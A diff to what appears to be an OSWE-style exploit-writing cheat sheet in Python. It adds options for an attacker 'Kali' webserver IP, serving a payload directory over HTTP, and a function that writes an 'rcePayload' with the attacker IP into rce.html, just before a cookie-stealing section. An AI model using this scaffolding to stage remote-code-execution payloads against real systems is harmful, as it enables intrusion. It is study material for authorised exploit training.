@@ -119,6 +119,9 @@ from http import cookies
 # For getting command-line arguments
 import argparse
 
+#For file path joining
+import os
+
 # For working with JDBC Java Drivers. NOTE: will need to set this up in an virtual venv
 import jaydebeapi
 ```
@@ -128,7 +131,8 @@ parser = argparse.ArgumentParser()
 parser.add_argument('--ip', help='IP Address', required=True)
 parser.add_argument('--user', help='User', required=True)
 parser.add_argument('--password', help='Password', required=True)
-parser.add_argument('--webserver', help='Path/to/webserver/directory', required=False)
+parser.add_argument('--webdir', help='Path/to/webserver/directory. default is /tmp', default='/tmp', required=False)
+parser.add_argument('-w','--webserverip', help='IP of the listening webserver, your local Kali IP.', required=True)
 args = parser.parse_args()
 ```
 
@@ -145,6 +149,12 @@ resp_obj = requests.get("https://github.com")
 ```python
 # GET method
 requests.get("https://github.com")
+
+# GET method without caring about the response
+try:
+    response = session.get(url, params=params, proxies=proxies, timeout=5)
+except requests.exceptions.ReadTimeout:
+    pass
 
 # POST method
 requests.post("https://github.com")
@@ -324,9 +334,9 @@ print("Body:\n", prepared_request.body)
 #### <a name='ServingfilesviaHTTP'></a>Serving files via HTTP
 
 ```python
-def startWebServer():
+def startWebServer(webdir):
     webServerProcess = subprocess.Popen(["python3", "-m", "http.server", "80"],
-    cwd="/opt/OSWE-Exercises/webserver",              
+    cwd = webdir,              
     stdout=subprocess.DEVNULL,
     stderr=subprocess.STDOUT)
     
@@ -336,6 +346,16 @@ def startWebServer():
 def stopWebServer(webServerProcess):
     webServerProcess.terminate()
     print ("[+] Webserver Stopped")
+```
+
+#### <a name='Writing To a File'></a>Writing to a File
+```python
+def writeFile(webserverip, webdir, rcePayload):
+    rcePayload = rcePayload.replace("<WEBSERVERIP>", webserverip)
+    webserverDirectory = webdir
+    outputFile = os.path.join(webserverDirectory, "rce.html")
+    with open(outputFile, "w", encoding="utf-8") as f:
+        f.write(rcePayload)
 ```
 
 #### <a name='StealingHTTPcookies'></a>Stealing HTTP cookies
